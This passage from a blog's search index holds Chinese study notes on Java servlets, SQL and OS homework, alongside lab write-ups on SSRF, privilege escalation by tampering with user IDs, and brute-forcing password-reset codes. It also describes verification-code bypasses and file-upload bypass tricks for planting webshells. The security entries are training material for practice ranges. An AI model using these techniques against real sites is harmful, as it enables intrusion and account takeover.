javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(&quot;/loginServlet&quot;) public class LoginServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { //1.设置编码 req.setCharacterEncoding(&quot;utf-8&quot;); //2.获取请求参数 String username = req.getParameter(&quot;username&quot;); String password = req.getParameter(&quot;password&quot;); //3.封装user对象 User loginUser = new User(); loginUser.setUsername(username); loginUser.setPassword(password); //4.调用UserDao的login方法 UserDao dao = new UserDao(); User user = dao.login(loginUser); //5.判断user if(user == null){ //登录失败 req.getRequestDispatcher(&quot;/failServlet&quot;).forward(req,resp); }else{ //登录成功 //存储数据 req.setAttribute(&quot;user&quot;,user); //转发 req.getRequestDispatcher(&quot;/successServlet&quot;).forward(req,resp); } } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { this.doGet(req,resp); } } 7. 编写FailServlet和SuccessServlet类 @WebServlet(&quot;/successServlet&quot;) public class SuccessServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //获取request域中共享的user对象 User user = (User) request.getAttribute(&quot;user&quot;); if(user != null){ //给页面写一句话 //设置编码 response.setContentType(&quot;text/html;charset=utf-8&quot;); //输出 response.getWriter().write(&quot;登录成功！&quot;+user.getUsername()+&quot;,欢迎您&quot;); } } @WebServlet(&quot;/failServlet&quot;) public class FailServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //给页面写一句话 //设置编码 response.setContentType(&quot;text/html;charset=utf-8&quot;); //输出 response.getWriter().write(&quot;登录失败，用户名或密码错误&quot;); } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { this.doPost(request,response); } } 8. login.html中form表单的action路径的写法 * 虚拟目录+Servlet的资源路径 9. BeanUtils工具类，简化数据封装 * 用于封装JavaBean的 1. JavaBean：标准的Java类 1. 要求： 1. 类必须被public修饰 2. 必须提供空参的构造器 3. 成员变量必须使用private修饰 4. 提供公共setter和getter方法 2. 功能：封装数据 2. 概念： 成员变量： 属性：setter和getter方法截取后的产物 例如：getUsername() --&gt; Username--&gt; username 3. 方法： 1. setProperty() 2. getProperty() 3. populate(Object obj , Map map):将map集合的键值对信息，封装到对应的JavaBean对象中","path":"2020/04/09/Servlet&HTTP&Request笔记/","date":"04-09","excerpt":"","tags":[{"name":"servlet","slug":"servlet","permalink":"http://wxnsoul.github.io/tags/servlet/"},{"name":"HTTP","slug":"HTTP","permalink":"http://wxnsoul.github.io/tags/HTTP/"},{"name":"Request","slug":"Request","permalink":"http://wxnsoul.github.io/tags/Request/"}]},{"title":"IDEA&Tomcat&Servlet笔记","text":"今日内容1. web相关概念回顾 2. web相关服务器软件:Tomcat 3. Servlet入门学习web相关概念回顾1. 软件架构 1. C/S:客户端/服务器端(通过相关软件访问服务器) 2. B/S:浏览器/服务器端(通过浏览器访问服务器即可)(主要学习任务) 2. 资源分类 1. 静态资源:所有用户访问后,得到的结果是一样的.静态资源可以被浏览器直接解析 * 如:html,css.JS 2. 动态资源.每个用户访问相同的资源后,得到的结果可能不一样.称为动态资源.动态资源被访问后,需要先转换成静态资源,然后再去被浏览器解析 * 如:servlet/jsp,php,asp... 3. 网络通信三要素 1. IP:电子设备(计算机)再网络中的唯一标识 2. 端口:应用程序再计算机中的唯一标识 0~65536(数据根据ip找到了你的计算机后需要根据端口号判断是哪个应用在请求数据) 3. 传输协议:规定了数据传输的规则 1. 基础协议: 1. tcp协议:安全协议,三次握手,速度稍慢 2. udp:广播协议,不安全,速度快 大致流程: web服务器软件* 服务器:安装了服务器软件的计算机(配置比一般的计算机高) * 服务器软件:接收用户的请求,处理请求,做出响应 * web服务器软件:接收用户的请求,处理请求,做出响应 * 在web服务器软件中,可以部署web项目,让用户通过浏览器来访问这些项目 * web容器 * 常见的java相关的web服务器软件: * weblogic:oracle公司,大型的Javaee服务器,支持所有的javaee规范,收费的 * webSphere : IBM公司，大型的JavaEE服务器，支持所有的JavaEE规范，收费的。 * JBOSS : JBOSS公司的，大型的JavaEE服务器，支持所有的JavaEE规范， 收费的。 * Tomcat : Apache基金组织，中小型的JavaEE服务器，仅仅支持少量的JavaEE规范(servlet/jsp)他是开源的,免费的 * Java语言在企业级开发中使用的技术规范的总和，- 共规定了13项大的规范 * Tomcat : web服务器软件 1. 下载: http://tomcat.apache.org/ 2. 安装:解压压缩包即可。 * 注意:安装目录建议不要有中文和空格 3. 卸载:删除目录就行了 4. 启动: * bin/startup.bat,双击运行该文件即可 * 访问:浏览器输入: http://localhost:8080 回车 * 可能遇到的问题 1. 黑窗口一闪而过: * 原因:没有正确配置JAVA_ HOME环境变量 * 解决方法:正确配置JAVA_HOME环境变量没因为配置文件里需要用到 2. 启动报错: 1. 暴力:找到占用的端口号,并找到对应进程,杀死改进程 2. 温柔:更改自身端口号.在server.xml配置文件里修改8080端口以及其他端口 3. - -般会将tomcat的默认端口号修改为80。80端口号是http协议的默认端口号。 * 好处:在访问时，就不用输入端口号 5. 关闭: 1. 强制关闭:直接点×或者断电 2. 正常关闭: * bin录下的shutdown.bat * 输入CTRL+C 6. 配置(*第三种比较推荐*) * 部署项目的方式 1. 直接将项目放到web目录下 * /hello :项目的访问路径-- &gt;虛拟目录 * 简化部署:将项目打包成war包,再war包放置到webapps目录下,他就会自动解压缩 2. 配置conf/server.xml文件 * 在&lt;Host&gt;标签体中配置&lt;Context docBase=&quot;D:\\hello&quot; path=&quot;/hehe&quot; /&gt; * docBase:项目存放的路径 * path:虚拟目录 * 缺点:容易弄坏配置文件 * 有点:灵活 3. 在conf\\Catalina\\localhost创建任意名称的xml文件。在文件中编写 * docBase=&quot;D:\\hello&quot; path=&quot;/hehe&quot; /&gt; * 这样虚拟目录就是这个xml文件的名称 * 静态项目和动态项目: * 目录结构 * Java动态项目的目录结构 * 项目的根目录 * --web.xml:web的核心配置文件 * --classes目录:放置字节码文件的目录 * lib目录:放置依赖的jar包 * 将Tomcat集成到IDEA中，并且创建JavaEE的项目，部署项目。| 目录结构解释 servlet: server applet* 概念:运行在服务器端的小程序 * Servlet就是一个接口,定义了Java类被浏览器访问到(tomcat识别)的规则 * 将来我们自定义一个类，实现Servlet接口，复写方法。 * 快速入门: 1. 创建一个javaee项目 2. 定义一个类,实现servlet接口 3. 实现接口中的抽象方法 4. 配置servlet(以后用户需要访问Java文件时需要通过url访问,所以需要配置资源名称) 在web.xml中配置: &lt;servlet&gt; &lt;servlet-name&gt;demo1&lt;/servlet-name&gt;&lt;!--起名--&gt; &lt;servlet-class&gt;cn.itcast.web.servlet.ServletDemo1&lt;/servlet-class&gt;&lt;!--对应的全类名--&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt;&lt;!--映射--&gt; &lt;servlet-name&gt;demo1&lt;/servlet-name&gt;&lt;!--与上面的对应,映射到那里--&gt; &lt;url-pattern&gt;/demo1&lt;/url-pattern&gt;&lt;!--将来能被哪个url访问到,写资源路径--&gt; &lt;/servlet-mapping&gt; * 执行原理: 1. 当服务器接收到客户端浏览器的请求后会去解析请求url路径,获取访问Servet的资源路径 2. 查找web.xml文件是否有对应的&lt;url-pattern&gt;标签体内容 3. 如果有,则在找到对应的&lt;servlet-class&gt;全类名 4. tomcat会将字节码文件加载进内存,并且创建对象 5. 调用其方法 * Servlet中的生命周期 1. 被创建:执行init方法,只执行一次 * Servlet什么时候被创建? * 默认情况下,第一次被访问时,Servlet被创建 * 可以配置执行Servlet的创建时机 * 在Servlet标签下创建 1. 第一次被访问时,创建 * &lt;load-on-startup&gt;值为负数 2. 在服务器启动时创建 * &lt;load-on-startup&gt;值为非负数 * Servlet的init方法,只执行一次,说明一个Servlet在内存中只存在一个对象,Servlet是单例的 * 用于初始化资源 * 多个用户同时访问时可能会存在线程安全问题 * 解决:尽量不要在Servlet中定义成员变量,就不会被共享,即使定义了成员变量,也不要对其进行修改值 2. 提供服务:执行service方法,会执行多次 * 每次访问servlet时，service方法都会被调用一次。 3. 被销毁:执行destory方法,只执行一次 * Servlet被销毁时执行。服务器关闭时，Servlet 被销毁 * 只有服务器正常关闭时,才会执行destory方法 * 小细节:在Servlet销毁之前执行,一般用于释放资 * Servlet3.0: * 好处: * 支持注解配置,可以不需要web.xml * 步骤: 1. 创建JavaEE项目,选择Servlet的版本3.0以上,可以不创建web.xml 2. 定义一个类,实现Servlet接口 3. 复写方法 4. 在类上使用@webServlet注解,进行配置 * @WebServlet(&quot;/资源路径&quot;) 原理图 IDEA和Tomcat的相关配置1. IDEA会为每一个tomcat部署的项目单独建立一个配置文件 * 查看控制台的log:Using CATALINA_BASE: &quot;目录&quot; 2. 工作空间项目 和 tomcat部署的web项目 * tomcat真正访问的是“tomcat部署的web项目”，&quot;tomcat部署的web项目&quot;对应着&quot;工作空间项目”的web目录下的所有资源 * WEB- INF目录下的资源不能被浏览器直接访问 * 断点调试: 1. 设置断点 2. 使用&quot;小虫子--debug&quot;启动","path":"2020/04/09/IDEA&Tomcat&Servlet笔记/","date":"04-09","excerpt":"","tags":[{"name":"servlet","slug":"servlet","permalink":"http://wxnsoul.github.io/tags/servlet/"}]},{"title":"SSRF--zkaq靶场","text":"原理 当一些网站可以传参去访问其他站点时,并且参数没有被过滤,那么就可以利用一些dict,file协议来让页面返回一些敏感信息File协议 中文意思：本地文件传输协议什么是File：File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样 解题 一开始提交了一个百度的页面,提交确实跳转到了百度)尝试输入dict://127.0.0.1:3306页面有返回这是数据库的版本然后用抓包找出所有有信息的端口)Payload设置数字从1-65535(所有端口)可以看到只有80,81,3306,6379四个端口可以使用,逐一尝试 这边要先普及一些小知识,这四个端口扫出来的是内网的可以使用的端口http://59.63.200.79:8019/index.php?ur看服务器的url,8019是访问外网的端口.这其中有什么区别呢?访问外网的8019端口,经路由器转发映射,到内网时就会变换成可以访问的内网端口现在一般都是一个ip,里面有着十几几十台服务器,然后通过路由器转发映射来达到访问 继续解题,这边使用file协议却显示404bad request,,,因为ssrf一般不支持file协议,转http协议,去尝试可以看到出来一个一模一样的页面,从而得知,外网的8019端口经路由器的转发映射就变成了内网的80端口,,他们是同一个这边再尝试一下81端口,但是啥都没有,这边是风哥设置的,让我们不要被浏览器所欺骗,应该查看页面源代码拿到flag","path":"2020/04/08/SSRF-zkaq靶场/","date":"04-08","excerpt":"","tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://wxnsoul.github.io/tags/SSRF/"}]},{"title":"SSRF","text":"前言 XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站XSS跨站脚本攻击CSRF跨站请求伪造SSRF服务器端请求伪造 定义 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人） 形成原因 SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。上面的话说的有点抽象，然后说一下网上大佬的理解首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。正常用户访问网站的流程是：输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应比如,【某个网站有个请求是www.baidu,com/xxx.php?image=URL】那么产生SSRF漏洞的环节在哪里呢？安全的网站应接收请求后，检测请求的合法性产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据例如：www.baidu.com/xxx.php?image=www.abc.com/1.jpg如果我们将www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码终极简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。实例 访问ip.cn它会显示你的外网ip,我们可以利用百度的翻译网页的功能让百度翻译区翻译ip.cn,外网ip就变成南京而不是江苏无锡了,因为是百度在南京的服务器去访问了所以翻译网站如果对输入的参数没有过滤就会存在SSRF 作用 现在主流的防御方法:外网防御很强悍,但是内网很脆弱 1.隐藏自己2.进入内网进行开心的渗透3.MySQL是不允许外部访问的,但是对于自己本地没有防护4.可以更好的对那台存在SSRF漏洞的服务器进行攻击SSRF支持的协议:file(访问本机文件的协议),dict(用于探测)http(访问内网的协议) 靶场实战 传送门:","path":"2020/04/08/SSRF/","date":"04-08","excerpt":"","tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://wxnsoul.github.io/tags/SSRF/"}]},{"title":"越权--zkaq靶场","text":"解法一 线路一用不了,去线路二,注册帐号先))使用burp抓包,很明显有两个敏感的字段userID和admin,先尝试修改UserId,改为1(因为一般admin为1)注意后面几个数据包的userID也要全部改成1,此时显示修改成功.尝试登录,却失败了,一直是失败的.尝试了好几次都是失败的.后来看录播发现是在点修改资料的时候就开始抓包了.这我就产生了一个问题:修改资料不抓包,修改密码时把userid改成1不应该也是修改的管理员账号的密码吗?)在修改资料是抓包,改掉id变为1)返回数据包之后发现资料以及变成管理员的了)再抓包修改密码并显示成功修改)退出登录使用刚刚的密码登陆成功!在后台找到flag 解法二 这边出了uesrid很敏感,admin和shenfen这两个看到了也会很敏感尝试修改shenfen和admin)身份改为之后竟然就是管理人员了,点击后台管理)却提示说不是管理员,这时候就需要再改admin了admin的值本来是,在编程中代表的时非的意思,所以虽然身份是管理员却没有权限.把shenfen改位1,admin改为1true)依旧不是管理人员,突然明白自己只改了第一个数据包,但是发送了很多个,需要全部改掉从点击修改资料的cookie到进入后台的数据包全部被修改了,直接实现了垂直越权关于无授权访问:直接进入后台而跳过登陆页面,且还拥有管理员身份,有的网站就会存在这样的bug","path":"2020/04/08/越权-zkaq靶场/","date":"04-08","excerpt":"","tags":[{"name":"越权","slug":"越权","permalink":"http://wxnsoul.github.io/tags/%E8%B6%8A%E6%9D%83/"}]},{"title":"越权","text":"定义 越权漏洞是一种很常见的逻辑安全漏洞。是由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致越权漏洞。目前存在着两种越权操作类型:横向越权操作(水平越权)和纵向越权(垂直越权)操作。 水平越权 水平越权是指相同权限下不同的用户可以互相访问水平越权测试方法主要就是看看能否通过A用户操作影响到B用户 垂直越权 垂直越权是指使用权限低的用户可以访问到权限较高的用户垂直越权的测试思路就是低权限用户越权使用高权限用户的功能，比如普通用户可使用管理员功能。 总之,把握住传参就能把握住逻辑漏洞的命脉 越权测试过程 登录A用户是，正常更改或者是查看A用户信息，然后抓取数据包，将传参ID(一般不为用户名)修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就属于水平越权测试。( 如果可以影响到高权限用户就是垂直越权)传参ID参数需要自己检测(常见: uid= id= user=等)通常使用burp进行爆破传参(传参可能在GET POST COOKIE)常见平行越权(不需要输入原密码的修改密码，抓包改用户名或者用户id修改他人密码,修改资料的时候修改用户id查看订单的时候，遍历订单id等) 靶场实战 传送门:","path":"2020/04/08/越权/","date":"04-08","excerpt":"","tags":[{"name":"越权","slug":"越权","permalink":"http://wxnsoul.github.io/tags/%E8%B6%8A%E6%9D%83/"}]},{"title":"SQL--实战进阶","text":"实战进阶记录对各个查询的理解~ 材料 ))) 实战 查询图书品种的总数目 查询每种图书品种的数目 group by作用:按图书名分组.聚合函数作用:在每一组中使用聚合函数得出一个值(一条记录) 查询各班的人数 查询各系的人数。需要用到depart表和student表,然后如何将这两个表连起来呢?就是student3163.学号=depart3163.学号 查询借阅图书学生的学号、姓名、书名和借书日期。用到三张表,两个连接条件 查询借有图书的学生的学号和 姓名。也只需连起两张表即可 查询每个学生的借书数目。 找出借书超过两本的学生的学号、姓名和所借图书册数。这一题做的时候卡了很久,不知道如何去判定大于2这个条件,后来想明白这题是必须使用group by得,在group by之后再去限定条件是只能够用having子句得.然后因为使用了别名as ‘图书册数’,在写having子句得时候变成了 having 借阅册数&gt;2,这样还是不对得,直接用count(*)代替借阅册数就好了.group by之前没什么变化,依旧是使用where条件连接两张表 查询借阅了“操作系统” 书的学生，输出学号、姓名及班号这题卡了一会会,因为自己少用了一个限定条件导致值重复很多,再将三张表连接起来之后还有一个图书名得条件 查询向每个班的借书总数。 若图书编号以前3位数字进行分类，查询每类图书的平均价卡住了.这题需要用到一些其他函数,substring 查询平均价高于30的图书类别。 查询图书类别的平均价、最高价这里我的定价用的是浮点是,所以没有用cast函数 假设借书期限为 45 天，查询过期未还图书的编号、书名和借书人的学号、姓名。)这题为了方便书写定义了几个变量b,o,s.还用到了一个获取现在时间得函数getdate().因为借阅时间都是14年得所以都超时被列出来了 杏向书名包括“工程”关键词的图书，输出书号、书名、作者用到了模糊查询like,where b.图书名= ‘%工程%’,%%匹配一次或者多次 查询现有图书中价格最高的图书，输出书名及作者。子查询,先查询到最高定价,然后价格=查询道德数据就能查询到是把一本书 查询所有借阅“ 程序设计” 一书的学生的学号和姓名，再查询所有借了“ 程序设计”但没有借“习题解答”的学生的学号和姓名。这题是两个查询操作,并不是只能用一个.然后用到了not in借阅了习题解答得,就是没有借得. 查询所有没有借书的学生得学号和姓名。这题同18,not in借书得就是没借得 查询每个系所借图书的总数。系名需要用到班号,所以得要三张表.将他们连接起来 查询各出版社的图书总数 查询各出版社的图书占图书总数的百分比（四舍五入到1位小数）)这里解释一个下cast函数.CAST函数用于将某种数据类型的表达式显式转换为另一种数据类型。CAST()函数的参数是一个表达式，它包括用AS关键字分隔的源值和目标数据类型。 语法：CAST (expression AS data_type)expression：任何有效的SQServer表达式。AS：用于分隔两个参数，在AS之前的是要处理的数据，在AS之后是要转换的数据类型。data_type：目标系统所提供的数据类型，包括bigint和sql_variant，不能使用用户定义的数据类型。百分比得话就需要用到cast,转换成decimal数据,做完除法运算后*100再转换成字符串类型,最后加上’%’ 查询各出版社的图书被借的数目。 总结 用到多张表可以使用参数简化表名 多张表注意连接,或者其他得限定条件 group by之前使用where限定条件,之后只能使用having子句限定条件.用到having子句时必须配合聚合函数一起使用,不能只有having子句 数据库会进行运算,会接受一些函数","path":"2020/04/08/SQL-实战进阶/","date":"04-08","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"OS习题--对分易作业2","text":"第一题 1、根据以下条件，分别利用FCFS、SPF、HRN、RR（时间片0.2）给出前三种种算法的进程调度顺序，计算每种算法中每个进程的周转时间、带权周转时间以及系统的平均周转时间、平均带权周转时间。))了解这几个概念就好:周转时间=程序最初结束时间-程序提交时间带权周转时间=周转时间/执行时间平均周转时间=所有作业周转时间之和/作业数量平均带权周转时间=所有作业带权周转时间之和/作业数量 FCFS:先来先服务,就是谁先来就先执行谁,所以顺序是1234 SPF:短作业优先算法:在当前有的作业里面选择执行时间最短的那个.8.00只有1,先执行1到9.00.那是有2,3,先执行3.然后9.10只有2,执行2.最后执行4所以是1324 HRN:高度相应比算法.求相应比,相应比高的优先执行.相应比=[(目前时间-提交时间)/执行时间]+1上题中,先进行作业1到九点,此时作业2的相应比:(9-8.5)/0.5+1=2;作业3=(9-9)/0.1+1=1;限制性作业2到9.50.此时作业3相应比:(9.50-9.00)/0.1+1=6.作业4:(9.50-9.2)/0.2+1=2.5所以先执行3,所以顺序是1234时间片轮转法就是按照我画的图来做的,这个应该比较记得清楚,毕竟自己做的.需要注意几个地方:1.执行完一个时间片之后若没执行完,此时新加入一个,那么应当排在新加入的后面2.如果时间片执行一半就执行完了,另一半不会空等着而是将下一个继续塞入剩下的半个时间片里 第二题 2、根据以下条件，利用RR（时间片q=2）进行进程调度，画出进程调度时间序列图，并计算每个进程的周转时间、带权周转时间以及系统的平均周转时间和平均带权周转时间。 第三题 3.利用记录型信号量写出不会发生死锁的五位哲学家就餐的程序。和第一次作业一样第四题 4、利用记录型信号量实现前趋图。)和第一次作业一样第五题 5、三个进程P1、P2、P3互斥使用一个包含N(N&gt;0)个单元的缓冲区。P1每次用put()将一个正整数送入缓冲区的一个单元中，P2每次用getodd()从缓冲区中取出一个奇数，P3每次用geteven()从缓冲区中取出一个偶数。试用信号量机制实现这三个进程的互斥与同步活动，用伪代码实现。 就是写程序,定义变量,函数.注意细节就好,比如说p1里对empty只有p操作,v操作应当在p2或者p3里第六题 6、桌子上有一只盘子，每次只能向其中放入一只水果。爸爸专向盘子中放苹果，妈妈专向盘子中放桔子，儿子专等吃盘子中的桔子，女儿专等吃盘子中的苹果。试用信号量机制实现这4个进程的互斥与同步活动，用伪代码实现)","path":"2020/04/08/OS习题-对分易作业2/","date":"04-08","excerpt":"","tags":[{"name":"OS习题","slug":"OS习题","permalink":"http://wxnsoul.github.io/tags/OS%E4%B9%A0%E9%A2%98/"}]},{"title":"OS习题--对分易作业1","text":"1、针对生产者-消费者问题: 写出中所定义的信号量名称、含义和初值。信号量:empty,表示缓冲区的个数(空缓冲区的个数)初始值为n;full,表示产品个数(满缓冲区的个数),初始值为0;mutex(表示互斥使用的缓冲池)初始值为1 两个wait操作可以换位置吗?为什么?不能,空缓冲区全满的情况下,此时full(缓冲区)=n,empty=0,如果先执行mutex,那么mutex变为0,再进行empty的p操作,empty就会变为-1,因为小于0所以阻塞自己.然后就会去进行消费者进行,此时mutex是0,然后先进行后变成-1也阻塞了,这样就死锁了.满缓冲区同理. 两个signal操作可以换位置吗?为什么?两个signal操作可以换位置。这两个互换位置之后只是影响进程对临界资源的释放的先后顺序，而不会引起系统死锁，因此可以互换位置。 2、利用记录型信号量写出不会发生死锁的五位哲学家就餐的程序。这段伪代码就是用来保证第i个哲学家一定能同时拿到左边两边的筷子,防止死锁.而不是其他解法,什么有一个哲学家不能吃 3、利用记录型信号量实现前趋图。 很简单,首先只要在每个箭头上从上往下从左往右的标上字母)然后再继续写伪代码,伪代码的格式也很容易记住就是p1,2,3,4,5,6,7七个函数,一个主函数,主函数里开始设置初始值,执行代码.七个函数都是统一的先执行p操作,再执行进程p,再v操作下一个流程.除了最开始的p1进程没有p操作和进程p1操作,只有单纯的v操作 总结 还是同容易理解的,把p操作当成减操作,v操作当初+操作. 实现互斥的P操作一定要在实现同步的P操作之后.互斥的就是互斥信号量mutex","path":"2020/04/07/OS习题-对分易作业1/","date":"04-07","excerpt":"","tags":[{"name":"OS习题","slug":"OS习题","permalink":"http://wxnsoul.github.io/tags/OS%E4%B9%A0%E9%A2%98/"}]},{"title":"hexo上传文章失败","text":"今天上传一篇密码找回和验证码绕过的writeup一直无法上传成功,查阅资料后发现是自己的tags定义了两次.所以失败了.有时候还会因为没有加半角空格而失败.","path":"2020/04/07/hexo上传文章失败/","date":"04-07","excerpt":"","tags":[{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"}]},{"title":"验证码绕过与密码找回--zkaq靶场","text":"tips 代码审计 这个靶场有个提示,验证码是从10到10000的某一个数字,所以可以通过爆破来获得验证码 爆破验证码 )邮箱有了,输入得密码是新的,输入正确得验证码即可改掉)抓取数据包之后开始爆破,输入新密码123456已经成功登录了虽然数据包长度都一样,但是无需知道具体的验证码是哪个,全部发送出去总有一个对的,然后就会修改密码根据tips再用户管理处拿到flag","path":"2020/04/07/验证码绕过与密码找回-zkaq靶场/","date":"04-07","excerpt":"","tags":[{"name":"验证码绕过和密码找回","slug":"验证码绕过和密码找回","permalink":"http://wxnsoul.github.io/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E5%92%8C%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/"}]},{"title":"验证码绕过与密码找回","text":"一、验证码作用 验证码(CAPTCHA)是“Completely Automated Public Turing test to tell Computers and Humans Apart”(全自动区分计算机和人类的图灵测试)的缩写，是一种区分用户是计算机还是人的公共全自动程序。可以防止:恶意破解密码、刷票、论坛灌水，有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试，实际上用验证码是现在很多网站通行的方式我们利用比较简易的方式实现了这个功能。这个问题可以由计算机生成并评判，但是必须只有人类才能解答。由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。验证码五花八门，有中文字，纯数字，点击字符、数学运算…. 二、验证码绕过的常见姿势 验证码绕过方向 1.通过验证码的逻辑进行入手2.通过Python、golang等程序自动识别设置了验证码并不是完全可靠，在很多情况存在验证码绕过的情况(举例是在登录处)一、前端验证验证码，并没有后端验证。直接抓包然后进行跑数据包，反正有没有验证码的阻碍二、验证码设置了但是并没有模验，乱输验证码也能够成功的登录(估计老板没给开发工资吧)三、验证码可以重复使用，比如现在的验证码1111，然后虽然你登录失败后验证码会变，但是你输入1111他却判定你验证码正确(常 见) ht:/www. anquan.us/static/bugs/wooyun-2016-0169672.html四、.验证码空值绕过，比如，我们现在抓一个包，发现登录参数是user=admin&amp;password=admin&amp;yzm=4123.yzm验证码参数，但是我们如果去掉yzm的传参我们就可以绕过验证码机制，直接传参user=admin&amp;password=admin，验证码就失效了五、验证码可控制，比如他的验证码包含在URL里面，是-一个URL传参，我们可以把URL设置定，那么验证码可控制六、验证码有规则，比如是时间戳的后6位(rand函 数进行随机数)七、有万能验证码，验证码无论是什么，只要输入000000就能直接绕过八、验证码有的时候会藏在cookie里面，分析一下是不是存在验证码的参数上面的是属于区分人机和人的,还有一种验证码是验证是不是你本人的(接收短信验证的) 三、密码找回漏洞上述的密码找回方法会有什么样的漏洞呢?1.验证码发送后前端返回( ht://w anquan us/static/bugs/wooyun-2016-0172266.html)2.验证码无次数限制可爆破3.验证码可控(ttp://www anquan.us/static/bugs/wooyun-2014-0867 16.html)4.直接修改密码页面(http://www. anquan.us/static/bugs/wooyun-2013-040908.html)有点像越权5.缺失的身份认证–&gt;绑定别人的账号到自己的手机(http://www. anquan.us/static/bugs/wooyun-2013-016896. html)6.越权漏洞–&gt;自己验证码通过改包然后修改他们密码 靶场实战 传送门:https://wxnsoul.github.io/2020/04/07/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E4%B8%8E%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/07/验证码绕过与密码找回/","date":"04-07","excerpt":"","tags":[{"name":"验证码绕过和密码找回","slug":"验证码绕过和密码找回","permalink":"http://wxnsoul.github.io/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E5%92%8C%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/"}]},{"title":"文件上传绕过姿势","text":"黑名单机制 只有前端简单的后缀名检测—直接抓包绕过前端即可 后端检测后缀名了—使用其他拓展名绕过使用其他能被解析的文件名绕过.此外还有， php: php phtml php3 php4 php5,这些都会被当成php解析所以有时可以拿phtml啥的去试一试. 上传.htaccess文件,让服务器按照.htaccess里的指令把jpg文件当作php处理 利用windows后缀名不区分大小写绕过 利用windows去解析文件的时候,会把php空格当成php去执行的.后端验证的时候接收的是’php空格’是在字符串里的,’php空格’却是不等于’php’的,毕竟空格也是一个字符,所以这边只要上传php空格后缀名即可 Windows下,在后缀名后面加上一个点.,他会提示你后缀名不可用然后把,给去掉,于是又可以利用一波 ::$DATA (Windows文 件流绕过) 逻辑漏洞.比如说按照过滤顺序,先去掉.在转换大小写,再去掉空格,那么可以这样123.php. .去完之后时123.php.又回到了之前 复写php绕过(比如说有时候会把php后缀给删去) 白名单机制 %00截断(url传参) 0x00截断(post传参) move_upload_file截断(只接受post传参) 条件竞争 asp特性 IIS分号截断 IIS斜杠截断 Nginx解析漏洞(直接加上.php访问即可)","path":"2020/04/06/文件上传绕过姿势/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"文件上端漏洞(20-23)--zkaq","text":"pass-20查看源码)虽然白名单里有asa但是if判断力依旧会去判断是否是图片文件,所以得绕过,百度制作图片马之后改成asp开始上传)发现服务器端被拦截了,就)根据特性绕过))成功上传了)根据地址访问到菜刀连接成功 pass-21 IIS分号截断 在一般得语言中,分号事结束一句代码得意思.在asp文件中,分号还能有着截断得作用,类似于0x00和%00 于是就可以这样as.asp;.jpg但也是和00截断有一点区别,当上传成功后去url中访问00截断需要把阶段以后的给删掉访问,但是asp这里就不需要,依旧要写在url中)利用分号的特性实现了绕过)根据图片的储存路径去访问,可以看到已经成功 Pass-22 IIS斜杠截断和上题唯一的区别就是把分号改成了斜杠 Pass-23 Nginx解析漏洞 )在靶场中,直接上传一张木马图,然后再url中打开,再jpg后加上/.php就能把jpg当成php执行就是直接在访问jpg文件的时候加上一个.php就行","path":"2020/04/06/文件上端漏洞-20-23-zkaq/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"文件上端漏洞(10-20)--zkaq","text":"pass-11 %00截断 